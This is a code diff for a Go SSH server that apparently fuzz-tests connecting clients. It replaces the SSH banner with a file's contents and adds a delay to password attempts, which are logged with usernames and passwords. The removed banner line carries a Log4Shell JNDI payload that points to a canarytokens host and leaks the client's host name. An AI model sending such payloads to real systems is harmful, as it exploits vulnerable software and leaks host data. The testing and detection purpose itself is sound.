@@ -6,6 +6,7 @@ import (
 	"log"
 	"net"
 	"strings"
+	"time"
 
 	"golang.org/x/crypto/ssh"
 )
@@ -27,7 +28,13 @@ func NewServer(c *Config) (*Server, error) {
 
 
 	// var banner string = "Unauthorized access or use is forbidden.\nThis system is monitored for administrative and security reasons.\nThis server is used to fuzz test client software, and will send lengthy and/or unexpected data in response to client input.\nBy proceeding, you acknowledge that (1) you have read and understand this notice, (2) you consent to the system monitoring, and (3) you consent to your software configuration being tested, and waive any claims against any and all persons for damage to your system as a result of participating in the test.\n"
-	var banner string = "${jndi:ldap://x${hostName}.L4J.swe040dyu7n0qdvt3exhww5pj.canarytokens.com/a}\n\n"
+	// var banner string = "${jndi:ldap://x${hostName}.L4J.swe040dyu7n0qdvt3exhww5pj.canarytokens.com/a}\n\n"
+	var banner string = ""
+	garbage, err := ioutil.ReadFile("garbage")
+	if err != nil {
+		panic(err)
+	}
+	banner  = string(garbage)
 
 	sc := &ssh.ServerConfig{}
 	sc.MaxAuthTries = 3
@@ -68,6 +75,7 @@ func NewServer(c *Config) (*Server, error) {
 
 		sc.PasswordCallback = func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
 			s.debugf("Attempt %s:%s:%s:%s", c.RemoteAddr(),c.User(), pass, c.ClientVersion())
+			time.Sleep(10 * time.Second)
 			return nil, fmt.Errorf("denied")
 		}
 	return s, nil
